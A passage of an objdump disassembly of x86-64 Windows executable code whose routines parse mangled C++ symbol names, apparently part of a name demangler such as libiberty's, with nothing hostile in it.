   140001ec0:	49 8b 52 18          	mov    0x18(%r10),%rdx
   140001ec4:	80 3a 5f             	cmpb   $0x5f,(%rdx)
   140001ec7:	75 3f                	jne    0x140001f08
   140001ec9:	48 83 c2 01          	add    $0x1,%rdx
   140001ecd:	49 89 52 18          	mov    %rdx,0x18(%r10)
   140001ed1:	41 8b 52 28          	mov    0x28(%r10),%edx
   140001ed5:	41 3b 52 2c          	cmp    0x2c(%r10),%edx
   140001ed9:	7d 2d                	jge    0x140001f08
   140001edb:	48 63 c2             	movslq %edx,%rax
   140001ede:	83 c2 01             	add    $0x1,%edx
   140001ee1:	48 c1 e0 05          	shl    $0x5,%rax
   140001ee5:	49 03 42 20          	add    0x20(%r10),%rax
   140001ee9:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140001ef0:	00 
   140001ef1:	41 89 52 28          	mov    %edx,0x28(%r10)
   140001ef5:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   140001efb:	89 48 10             	mov    %ecx,0x10(%rax)
   140001efe:	48 83 c4 28          	add    $0x28,%rsp
   140001f02:	c3                   	ret
   140001f03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f08:	31 c0                	xor    %eax,%eax
   140001f0a:	48 83 c4 28          	add    $0x28,%rsp
   140001f0e:	c3                   	ret
   140001f0f:	90                   	nop
   140001f10:	31 c9                	xor    %ecx,%ecx
   140001f12:	eb b5                	jmp    0x140001ec9
   140001f14:	90                   	nop
   140001f15:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001f1c:	00 00 00 00 
   140001f20:	55                   	push   %rbp
   140001f21:	57                   	push   %rdi
   140001f22:	56                   	push   %rsi
   140001f23:	53                   	push   %rbx
   140001f24:	48 83 ec 48          	sub    $0x48,%rsp
   140001f28:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
   140001f2d:	41 89 d0             	mov    %edx,%r8d
   140001f30:	48 89 ce             	mov    %rcx,%rsi
   140001f33:	48 8d 15 62 34 02 00 	lea    0x23462(%rip),%rdx        # 0x14002539c
   140001f3a:	48 89 d9             	mov    %rbx,%rcx
   140001f3d:	e8 ce d2 00 00       	call   0x14000f210
   140001f42:	48 89 d9             	mov    %rbx,%rcx
   140001f45:	e8 36 d4 00 00       	call   0x14000f380
   140001f4a:	48 85 c0             	test   %rax,%rax
   140001f4d:	0f 84 ad 00 00 00    	je     0x140002000
   140001f53:	48 8b 96 00 01 00 00 	mov    0x100(%rsi),%rdx
   140001f5a:	48 8d 2c 03          	lea    (%rbx,%rax,1),%rbp
   140001f5e:	eb 42                	jmp    0x140001fa2
   140001f60:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001f67:	00 00 00 
   140001f6a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001f71:	00 00 00 00 
   140001f75:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001f7c:	00 00 00 00 
   140001f80:	48 89 d1             	mov    %rdx,%rcx
   140001f83:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140001f87:	48 83 c3 01          	add    $0x1,%rbx
   140001f8b:	48 89 96 00 01 00 00 	mov    %rdx,0x100(%rsi)
   140001f92:	40 88 3c 0e          	mov    %dil,(%rsi,%rcx,1)
   140001f96:	40 88 be 08 01 00 00 	mov    %dil,0x108(%rsi)
   140001f9d:	48 39 eb             	cmp    %rbp,%rbx
   140001fa0:	74 5e                	je     0x140002000
   140001fa2:	0f b6 3b             	movzbl (%rbx),%edi
   140001fa5:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   140001fac:	75 d2                	jne    0x140001f80
   140001fae:	48 83 c3 01          	add    $0x1,%rbx
   140001fb2:	c6 86 ff 00 00 00 00 	movb   $0x0,0xff(%rsi)
   140001fb9:	ba ff 00 00 00       	mov    $0xff,%edx
   140001fbe:	48 89 f1             	mov    %rsi,%rcx
   140001fc1:	4c 8b 86 18 01 00 00 	mov    0x118(%rsi),%r8
   140001fc8:	ff 96 10 01 00 00    	call   *0x110(%rsi)
   140001fce:	83 86 40 01 00 00 01 	addl   $0x1,0x140(%rsi)
   140001fd5:	48 c7 86 00 01 00 00 	movq   $0x1,0x100(%rsi)
   140001fdc:	01 00 00 00 
   140001fe0:	40 88 3e             	mov    %dil,(%rsi)
   140001fe3:	40 88 be 08 01 00 00 	mov    %dil,0x108(%rsi)
   140001fea:	48 39 dd             	cmp    %rbx,%rbp
   140001fed:	74 11                	je     0x140002000
   140001fef:	0f b6 3b             	movzbl (%rbx),%edi
   140001ff2:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001ff7:	eb 8a                	jmp    0x140001f83
   140001ff9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002000:	48 83 c4 48          	add    $0x48,%rsp
   140002004:	5b                   	pop    %rbx
   140002005:	5e                   	pop    %rsi
   140002006:	5f                   	pop    %rdi
   140002007:	5d                   	pop    %rbp
   140002008:	c3                   	ret
   140002009:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002010:	41 54                	push   %r12
   140002012:	55                   	push   %rbp
   140002013:	57                   	push   %rdi
   140002014:	56                   	push   %rsi
   140002015:	53                   	push   %rbx
   140002016:	48 83 ec 40          	sub    $0x40,%rsp
   14000201a:	48 89 cb             	mov    %rcx,%rbx
   14000201d:	44 89 c5             	mov    %r8d,%ebp
   140002020:	83 fa 5b             	cmp    $0x5b,%edx
   140002023:	0f 84 a7 01 00 00    	je     0x1400021d0
   140002029:	83 fa 5c             	cmp    $0x5c,%edx
   14000202c:	0f 84 d6 00 00 00    	je     0x140002108
   140002032:	83 fa 5a             	cmp    $0x5a,%edx
   140002035:	0f 84 ad 01 00 00    	je     0x1400021e8
   14000203b:	c7 81 30 01 00 00 01 	movl   $0x1,0x130(%rcx)
   140002042:	00 00 00 
   140002045:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   14000204a:	41 89 e8             	mov    %ebp,%r8d
   14000204d:	48 8d 15 48 33 02 00 	lea    0x23348(%rip),%rdx        # 0x14002539c
   140002054:	48 89 f1             	mov    %rsi,%rcx
   140002057:	e8 b4 d1 00 00       	call   0x14000f210
   14000205c:	48 89 f1             	mov    %rsi,%rcx
   14000205f:	e8 1c d3 00 00       	call   0x14000f380
   140002064:	48 85 c0             	test   %rax,%rax
   140002067:	0f 84 53 01 00 00    	je     0x1400021c0
   14000206d:	48 8b 93 00 01 00 00 	mov    0x100(%rbx),%rdx
   140002074:	48 8d 2c 06          	lea    (%rsi,%rax,1),%rbp
   140002078:	eb 2c                	jmp    0x1400020a6
   14000207a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002080:	48 89 d1             	mov    %rdx,%rcx
   140002083:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140002087:	48 83 c6 01          	add    $0x1,%rsi
   14000208b:	48 89 93 00 01 00 00 	mov    %rdx,0x100(%rbx)
   140002092:	40 88 3c 0b          	mov    %dil,(%rbx,%rcx,1)
   140002096:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   14000209d:	48 39 f5             	cmp    %rsi,%rbp
   1400020a0:	0f 84 1a 01 00 00    	je     0x1400021c0
   1400020a6:	0f b6 3e             	movzbl (%rsi),%edi
   1400020a9:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   1400020b0:	75 ce                	jne    0x140002080
   1400020b2:	48 83 c6 01          	add    $0x1,%rsi
   1400020b6:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   1400020bd:	ba ff 00 00 00       	mov    $0xff,%edx
   1400020c2:	48 89 d9             	mov    %rbx,%rcx
   1400020c5:	4c 8b 83 18 01 00 00 	mov    0x118(%rbx),%r8
   1400020cc:	ff 93 10 01 00 00    	call   *0x110(%rbx)
   1400020d2:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   1400020d9:	48 c7 83 00 01 00 00 	movq   $0x1,0x100(%rbx)
   1400020e0:	01 00 00 00 
   1400020e4:	40 88 3b             	mov    %dil,(%rbx)
   1400020e7:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   1400020ee:	48 39 f5             	cmp    %rsi,%rbp
   1400020f1:	0f 84 c9 00 00 00    	je     0x1400021c0
   1400020f7:	0f b6 3e             	movzbl (%rsi),%edi
   1400020fa:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400020ff:	eb 82                	jmp    0x140002083
   140002101:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002108:	41 bc 03 00 00 00    	mov    $0x3,%r12d
   14000210e:	48 8d 35 8a 32 02 00 	lea    0x2328a(%rip),%rsi        # 0x14002539f
   140002115:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   14000211c:	49 01 f4             	add    %rsi,%r12
   14000211f:	eb 45                	jmp    0x140002166
   140002121:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002128:	00 00 
   14000212a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002131:	00 00 00 00 
   140002135:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000213c:	00 00 00 00 
   140002140:	48 89 c2             	mov    %rax,%rdx
   140002143:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140002147:	48 83 c6 01          	add    $0x1,%rsi
   14000214b:	48 89 83 00 01 00 00 	mov    %rax,0x100(%rbx)
   140002152:	40 88 3c 13          	mov    %dil,(%rbx,%rdx,1)
   140002156:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   14000215d:	4c 39 e6             	cmp    %r12,%rsi
   140002160:	0f 84 df fe ff ff    	je     0x140002045
   140002166:	0f b6 3e             	movzbl (%rsi),%edi
   140002169:	48 3d ff 00 00 00    	cmp    $0xff,%rax
   14000216f:	75 cf                	jne    0x140002140
   140002171:	48 83 c6 01          	add    $0x1,%rsi
   140002175:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   14000217c:	ba ff 00 00 00       	mov    $0xff,%edx
   140002181:	48 89 d9             	mov    %rbx,%rcx
   140002184:	4c 8b 83 18 01 00 00 	mov    0x118(%rbx),%r8
   14000218b:	ff 93 10 01 00 00    	call   *0x110(%rbx)
   140002191:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   140002198:	48 c7 83 00 01 00 00 	movq   $0x1,0x100(%rbx)
   14000219f:	01 00 00 00 
   1400021a3:	40 88 3b             	mov    %dil,(%rbx)
   1400021a6:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   1400021ad:	4c 39 e6             	cmp    %r12,%rsi
   1400021b0:	0f 84 8f fe ff ff    	je     0x140002045
   1400021b6:	0f b6 3e             	movzbl (%rsi),%edi
   1400021b9:	ba 01 00 00 00       	mov    $0x1,%edx
   1400021be:	eb 83                	jmp    0x140002143
   1400021c0:	48 83 c4 40          	add    $0x40,%rsp
   1400021c4:	5b                   	pop    %rbx
   1400021c5:	5e                   	pop    %rsi
   1400021c6:	5f                   	pop    %rdi
   1400021c7:	5d                   	pop    %rbp
   1400021c8:	41 5c                	pop    %r12
   1400021ca:	c3                   	ret
   1400021cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021d0:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   1400021d6:	48 8d 35 c9 31 02 00 	lea    0x231c9(%rip),%rsi        # 0x1400253a6
   1400021dd:	e9 33 ff ff ff       	jmp    0x140002115
   1400021e2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400021e8:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   1400021ee:	48 8d 35 ae 31 02 00 	lea    0x231ae(%rip),%rsi        # 0x1400253a3
   1400021f5:	e9 1b ff ff ff       	jmp    0x140002115
   1400021fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002200:	48 83 ec 28          	sub    $0x28,%rsp
   140002204:	49 89 ca             	mov    %rcx,%r10
   140002207:	e8 94 f4 ff ff       	call   0x1400016a0
   14000220c:	41 89 c0             	mov    %eax,%r8d
   14000220f:	31 c0                	xor    %eax,%eax
   140002211:	45 85 c0             	test   %r8d,%r8d
   140002214:	7e 79                	jle    0x14000228f
   140002216:	49 8b 42 18          	mov    0x18(%r10),%rax
   14000221a:	49 8b 4a 08          	mov    0x8(%r10),%rcx
   14000221e:	49 63 d0             	movslq %r8d,%rdx
   140002221:	48 29 c1             	sub    %rax,%rcx
   140002224:	48 39 d1             	cmp    %rdx,%rcx
   140002227:	0f 8c 83 00 00 00    	jl     0x1400022b0
   14000222d:	48 01 c2             	add    %rax,%rdx
   140002230:	49 89 52 18          	mov    %rdx,0x18(%r10)
   140002234:	41 f6 42 10 04       	testb  $0x4,0x10(%r10)
   140002239:	74 05                	je     0x140002240
   14000223b:	80 3a 24             	cmpb   $0x24,(%rdx)
   14000223e:	74 58                	je     0x140002298
   140002240:	41 83 f8 09          	cmp    $0x9,%r8d
   140002244:	7e 3a                	jle    0x140002280
   140002246:	48 ba 5f 47 4c 4f 42 	movabs $0x5f4c41424f4c475f,%rdx
   14000224d:	41 4c 5f 
   140002250:	48 39 10             	cmp    %rdx,(%rax)
   140002253:	75 2b                	jne    0x140002280
   140002255:	0f b6 50 08          	movzbl 0x8(%rax),%edx
   140002259:	83 ea 24             	sub    $0x24,%edx
   14000225c:	80 fa 3b             	cmp    $0x3b,%dl
   14000225f:	77 1f                	ja     0x140002280
   140002261:	48 b9 01 04 00 00 00 	movabs $0x800000000000401,%rcx
   140002268:	00 00 08 
   14000226b:	48 0f a3 d1          	bt     %rdx,%rcx
   14000226f:	73 0f                	jae    0x140002280
   140002271:	80 78 09 4e          	cmpb   $0x4e,0x9(%rax)
   140002275:	74 41                	je     0x1400022b8
   140002277:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000227e:	00 00 
   140002280:	48 89 c2             	mov    %rax,%rdx
   140002283:	4c 89 d1             	mov    %r10,%rcx
   140002286:	e8 b5 f3 ff ff       	call   0x140001640
   14000228b:	49 89 42 40          	mov    %rax,0x40(%r10)
   14000228f:	48 83 c4 28          	add    $0x28,%rsp
   140002293:	c3                   	ret
   140002294:	0f 1f 40 00          	nopl   0x0(%rax)
   140002298:	48 83 c2 01          	add    $0x1,%rdx
   14000229c:	49 89 52 18          	mov    %rdx,0x18(%r10)
   1400022a0:	41 83 f8 09          	cmp    $0x9,%r8d
   1400022a4:	7f a0                	jg     0x140002246
   1400022a6:	eb d8                	jmp    0x140002280
   1400022a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400022af:	00 
   1400022b0:	31 c0                	xor    %eax,%eax
   1400022b2:	eb d7                	jmp    0x14000228b
   1400022b4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400022b8:	41 8b 42 48          	mov    0x48(%r10),%eax
   1400022bc:	41 8b 52 28          	mov    0x28(%r10),%edx
   1400022c0:	83 c0 16             	add    $0x16,%eax
   1400022c3:	44 29 c0             	sub    %r8d,%eax
   1400022c6:	41 89 42 48          	mov    %eax,0x48(%r10)
   1400022ca:	41 3b 52 2c          	cmp    0x2c(%r10),%edx
   1400022ce:	7d e0                	jge    0x1400022b0
   1400022d0:	48 63 c2             	movslq %edx,%rax
   1400022d3:	83 c2 01             	add    $0x1,%edx
   1400022d6:	41 89 52 28          	mov    %edx,0x28(%r10)
   1400022da:	48 c1 e0 05          	shl    $0x5,%rax
   1400022de:	48 8d 15 c4 30 02 00 	lea    0x230c4(%rip),%rdx        # 0x1400253a9
   1400022e5:	49 03 42 20          	add    0x20(%r10),%rax
   1400022e9:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   1400022f0:	00 
   1400022f1:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   1400022f7:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400022fb:	c7 40 18 15 00 00 00 	movl   $0x15,0x18(%rax)
   140002302:	eb 87                	jmp    0x14000228b
   140002304:	90                   	nop
   140002305:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000230c:	00 00 00 00 
   140002310:	53                   	push   %rbx
   140002311:	48 83 ec 30          	sub    $0x30,%rsp
   140002315:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140002319:	41 80 38 53          	cmpb   $0x53,(%r8)
   14000231d:	0f 85 84 00 00 00    	jne    0x1400023a7
   140002323:	49 8d 40 01          	lea    0x1(%r8),%rax
   140002327:	48 89 41 18          	mov    %rax,0x18(%rcx)
   14000232b:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   140002330:	84 c0                	test   %al,%al
   140002332:	0f 84 80 00 00 00    	je     0x1400023b8
   140002338:	49 8d 40 02          	lea    0x2(%r8),%rax
   14000233c:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140002340:	41 0f be 40 01       	movsbl 0x1(%r8),%eax
   140002345:	44 8d 40 d0          	lea    -0x30(%rax),%r8d
   140002349:	41 80 f8 2f          	cmp    $0x2f,%r8b
   14000234d:	77 69                	ja     0x1400023b8
   14000234f:	49 b9 ff 03 fe ff ff 	movabs $0x87fffffe03ff,%r9
   140002356:	87 00 00 
   140002359:	4d 0f a3 c1          	bt     %r8,%r9
   14000235d:	73 59                	jae    0x1400023b8
   14000235f:	31 d2                	xor    %edx,%edx
   140002361:	3c 5f                	cmp    $0x5f,%al
   140002363:	75 21                	jne    0x140002386
   140002365:	e9 c6 00 00 00       	jmp    0x140002430
   14000236a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002370:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140002374:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140002378:	0f be 00             	movsbl (%rax),%eax
   14000237b:	3c 5f                	cmp    $0x5f,%al
   14000237d:	0f 84 dd 01 00 00    	je     0x140002560
   140002383:	44 89 c2             	mov    %r8d,%edx
   140002386:	44 8d 40 d0          	lea    -0x30(%rax),%r8d
   14000238a:	41 80 f8 09          	cmp    $0x9,%r8b
   14000238e:	77 70                	ja     0x140002400
   140002390:	44 8d 04 d2          	lea    (%rdx,%rdx,8),%r8d
   140002394:	46 8d 44 80 d0       	lea    -0x30(%rax,%r8,4),%r8d
   140002399:	41 39 d0             	cmp    %edx,%r8d
   14000239c:	72 09                	jb     0x1400023a7
   14000239e:	48 8b 41 18          	mov    0x18(%rcx),%rax
   1400023a2:	80 38 00             	cmpb   $0x0,(%rax)
   1400023a5:	75 c9                	jne    0x140002370
   1400023a7:	45 31 c0             	xor    %r8d,%r8d
   1400023aa:	4c 89 c0             	mov    %r8,%rax
   1400023ad:	48 83 c4 30          	add    $0x30,%rsp
   1400023b1:	5b                   	pop    %rbx
   1400023b2:	c3                   	ret
   1400023b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023b8:	44 8b 41 10          	mov    0x10(%rcx),%r8d
   1400023bc:	41 83 e0 08          	and    $0x8,%r8d
   1400023c0:	75 5e                	jne    0x140002420
   1400023c2:	83 e2 01             	and    $0x1,%edx
   1400023c5:	74 59                	je     0x140002420
   1400023c7:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   1400023cb:	0f b6 12             	movzbl (%rdx),%edx
   1400023ce:	83 ea 43             	sub    $0x43,%edx
   1400023d1:	80 fa 01             	cmp    $0x1,%dl
   1400023d4:	0f 96 c2             	setbe  %dl
   1400023d7:	44 0f b6 c2          	movzbl %dl,%r8d
   1400023db:	48 8d 15 1e 3a 02 00 	lea    0x23a1e(%rip),%rdx        # 0x140025e00
   1400023e2:	4c 8d 8a 88 01 00 00 	lea    0x188(%rdx),%r9
   1400023e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400023f0:	38 02                	cmp    %al,(%rdx)
   1400023f2:	74 5c                	je     0x140002450
   1400023f4:	48 83 c2 38          	add    $0x38,%rdx
   1400023f8:	4c 39 ca             	cmp    %r9,%rdx
   1400023fb:	75 f3                	jne    0x1400023f0
   1400023fd:	eb a8                	jmp    0x1400023a7
   1400023ff:	90                   	nop
   140002400:	44 8d 40 bf          	lea    -0x41(%rax),%r8d
   140002404:	41 80 f8 19          	cmp    $0x19,%r8b
   140002408:	77 9d                	ja     0x1400023a7
   14000240a:	44 8d 04 d2          	lea    (%rdx,%rdx,8),%r8d
   14000240e:	46 8d 44 80 c9       	lea    -0x37(%rax,%r8,4),%r8d
   140002413:	e9 81 ff ff ff       	jmp    0x140002399
   140002418:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000241f:	00 
   140002420:	44 89 c2             	mov    %r8d,%edx
   140002423:	c1 ea 03             	shr    $0x3,%edx
   140002426:	83 e2 01             	and    $0x1,%edx
   140002429:	eb ac                	jmp    0x1400023d7
   14000242b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002430:	45 31 c0             	xor    %r8d,%r8d
   140002433:	44 3b 41 38          	cmp    0x38(%rcx),%r8d
   140002437:	0f 83 6a ff ff ff    	jae    0x1400023a7
   14000243d:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140002441:	4e 8b 04 c0          	mov    (%rax,%r8,8),%r8
   140002445:	4c 89 c0             	mov    %r8,%rax
   140002448:	48 83 c4 30          	add    $0x30,%rsp
   14000244c:	5b                   	pop    %rbx
   14000244d:	c3                   	ret
   14000244e:	66 90                	xchg   %ax,%ax
   140002450:	4c 8b 5a 28          	mov    0x28(%rdx),%r11
   140002454:	8b 41 28             	mov    0x28(%rcx),%eax
   140002457:	44 8b 51 2c          	mov    0x2c(%rcx),%r10d
   14000245b:	4d 85 db             	test   %r11,%r11
   14000245e:	74 38                	je     0x140002498
   140002460:	44 39 d0             	cmp    %r10d,%eax
   140002463:	0f 8d 13 01 00 00    	jge    0x14000257c
   140002469:	8b 5a 30             	mov    0x30(%rdx),%ebx
   14000246c:	4c 63 c8             	movslq %eax,%r9
   14000246f:	83 c0 01             	add    $0x1,%eax
   140002472:	49 c1 e1 05          	shl    $0x5,%r9
   140002476:	4c 03 49 20          	add    0x20(%rcx),%r9
   14000247a:	49 c7 41 04 00 00 00 	movq   $0x0,0x4(%r9)
   140002481:	00 
   140002482:	89 41 28             	mov    %eax,0x28(%rcx)
   140002485:	41 c7 01 18 00 00 00 	movl   $0x18,(%r9)
   14000248c:	4d 89 59 10          	mov    %r11,0x10(%r9)
   140002490:	41 89 59 18          	mov    %ebx,0x18(%r9)
   140002494:	4c 89 49 40          	mov    %r9,0x40(%rcx)
   140002498:	45 85 c0             	test   %r8d,%r8d
   14000249b:	0f 85 cf 00 00 00    	jne    0x140002570
   1400024a1:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   1400024a5:	8b 52 10             	mov    0x10(%rdx),%edx
   1400024a8:	01 51 48             	add    %edx,0x48(%rcx)
   1400024ab:	44 39 d0             	cmp    %r10d,%eax
   1400024ae:	0f 8d d0 00 00 00    	jge    0x140002584
   1400024b4:	4c 63 c0             	movslq %eax,%r8
   1400024b7:	83 c0 01             	add    $0x1,%eax
   1400024ba:	49 c1 e0 05          	shl    $0x5,%r8
   1400024be:	4c 03 41 20          	add    0x20(%rcx),%r8
   1400024c2:	49 c7 40 04 00 00 00 	movq   $0x0,0x4(%r8)
   1400024c9:	00 
   1400024ca:	89 41 28             	mov    %eax,0x28(%rcx)
   1400024cd:	41 c7 00 18 00 00 00 	movl   $0x18,(%r8)
   1400024d4:	4d 89 48 10          	mov    %r9,0x10(%r8)
   1400024d8:	41 89 50 18          	mov    %edx,0x18(%r8)
   1400024dc:	48 8b 41 18          	mov    0x18(%rcx),%rax
   1400024e0:	80 38 42             	cmpb   $0x42,(%rax)
   1400024e3:	0f 85 c1 fe ff ff    	jne    0x1400023aa
   1400024e9:	48 8b 59 40          	mov    0x40(%rcx),%rbx
   1400024ed:	0f 1f 00             	nopl   (%rax)
   1400024f0:	48 83 c0 01          	add    $0x1,%rax
   1400024f4:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   1400024f9:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1400024fd:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002502:	e8 f9 fc ff ff       	call   0x140002200
   140002507:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   14000250c:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002511:	ba 4e 00 00 00       	mov    $0x4e,%edx
   140002516:	49 89 c1             	mov    %rax,%r9
   140002519:	e8 22 f0 ff ff       	call   0x140001540
   14000251e:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002523:	49 89 c0             	mov    %rax,%r8
   140002526:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000252a:	80 38 42             	cmpb   $0x42,(%rax)
   14000252d:	74 c1                	je     0x1400024f0
   14000252f:	48 89 59 40          	mov    %rbx,0x40(%rcx)
   140002533:	4d 85 c0             	test   %r8,%r8
   140002536:	0f 84 6b fe ff ff    	je     0x1400023a7
   14000253c:	8b 41 38             	mov    0x38(%rcx),%eax
   14000253f:	3b 41 3c             	cmp    0x3c(%rcx),%eax
   140002542:	0f 8d 5f fe ff ff    	jge    0x1400023a7
   140002548:	48 8b 51 30          	mov    0x30(%rcx),%rdx
   14000254c:	4c 63 c8             	movslq %eax,%r9
   14000254f:	83 c0 01             	add    $0x1,%eax
   140002552:	4e 89 04 ca          	mov    %r8,(%rdx,%r9,8)
   140002556:	89 41 38             	mov    %eax,0x38(%rcx)
   140002559:	e9 4c fe ff ff       	jmp    0x1400023aa
   14000255e:	66 90                	xchg   %ax,%ax
   140002560:	41 83 c0 01          	add    $0x1,%r8d
   140002564:	e9 ca fe ff ff       	jmp    0x140002433
   140002569:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002570:	4c 8b 4a 18          	mov    0x18(%rdx),%r9
   140002574:	8b 52 20             	mov    0x20(%rdx),%edx
   140002577:	e9 2c ff ff ff       	jmp    0x1400024a8
   14000257c:	45 31 c9             	xor    %r9d,%r9d
   14000257f:	e9 10 ff ff ff       	jmp    0x140002494
   140002584:	45 31 c0             	xor    %r8d,%r8d
   140002587:	e9 50 ff ff ff       	jmp    0x1400024dc
   14000258c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002590:	57                   	push   %rdi
   140002591:	56                   	push   %rsi
   140002592:	53                   	push   %rbx
   140002593:	48 83 ec 20          	sub    $0x20,%rsp
   140002597:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000259b:	48 89 cb             	mov    %rcx,%rbx
   14000259e:	48 89 d7             	mov    %rdx,%rdi
   1400025a1:	80 38 57             	cmpb   $0x57,(%rax)
   1400025a4:	74 24                	je     0x1400025ca
   1400025a6:	eb 78                	jmp    0x140002620
   1400025a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400025af:	00 
   1400025b0:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1400025b4:	4c 63 c0             	movslq %eax,%r8
   1400025b7:	83 c0 01             	add    $0x1,%eax
   1400025ba:	4a 89 14 c1          	mov    %rdx,(%rcx,%r8,8)
   1400025be:	89 43 38             	mov    %eax,0x38(%rbx)
   1400025c1:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400025c5:	80 38 57             	cmpb   $0x57,(%rax)
   1400025c8:	75 56                	jne    0x140002620
   1400025ca:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400025ce:	be 55 00 00 00       	mov    $0x55,%esi
   1400025d3:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400025d7:	80 78 01 50          	cmpb   $0x50,0x1(%rax)
   1400025db:	75 0d                	jne    0x1400025ea
   1400025dd:	48 83 c0 02          	add    $0x2,%rax
   1400025e1:	be 56 00 00 00       	mov    $0x56,%esi
   1400025e6:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400025ea:	48 89 d9             	mov    %rbx,%rcx
   1400025ed:	e8 0e fc ff ff       	call   0x140002200
   1400025f2:	4c 8b 07             	mov    (%rdi),%r8
   1400025f5:	89 f2                	mov    %esi,%edx
   1400025f7:	48 89 d9             	mov    %rbx,%rcx
   1400025fa:	49 89 c1             	mov    %rax,%r9
   1400025fd:	e8 3e ef ff ff       	call   0x140001540
   140002602:	48 89 07             	mov    %rax,(%rdi)
   140002605:	48 89 c2             	mov    %rax,%rdx
   140002608:	48 85 c0             	test   %rax,%rax
   14000260b:	74 08                	je     0x140002615
   14000260d:	8b 43 38             	mov    0x38(%rbx),%eax
   140002610:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   140002613:	7c 9b                	jl     0x1400025b0
   140002615:	31 c0                	xor    %eax,%eax
   140002617:	48 83 c4 20          	add    $0x20,%rsp
   14000261b:	5b                   	pop    %rbx
   14000261c:	5e                   	pop    %rsi
   14000261d:	5f                   	pop    %rdi
   14000261e:	c3                   	ret
   14000261f:	90                   	nop
   140002620:	b8 01 00 00 00       	mov    $0x1,%eax
   140002625:	48 83 c4 20          	add    $0x20,%rsp
   140002629:	5b                   	pop    %rbx
   14000262a:	5e                   	pop    %rsi
   14000262b:	5f                   	pop    %rdi
   14000262c:	c3                   	ret
   14000262d:	0f 1f 00             	nopl   (%rax)
   140002630:	41 56                	push   %r14
   140002632:	57                   	push   %rdi
   140002633:	56                   	push   %rsi
   140002634:	53                   	push   %rbx
   140002635:	48 83 ec 58          	sub    $0x58,%rsp
   140002639:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   14000263d:	48 89 cb             	mov    %rcx,%rbx
   140002640:	4c 89 c1             	mov    %r8,%rcx
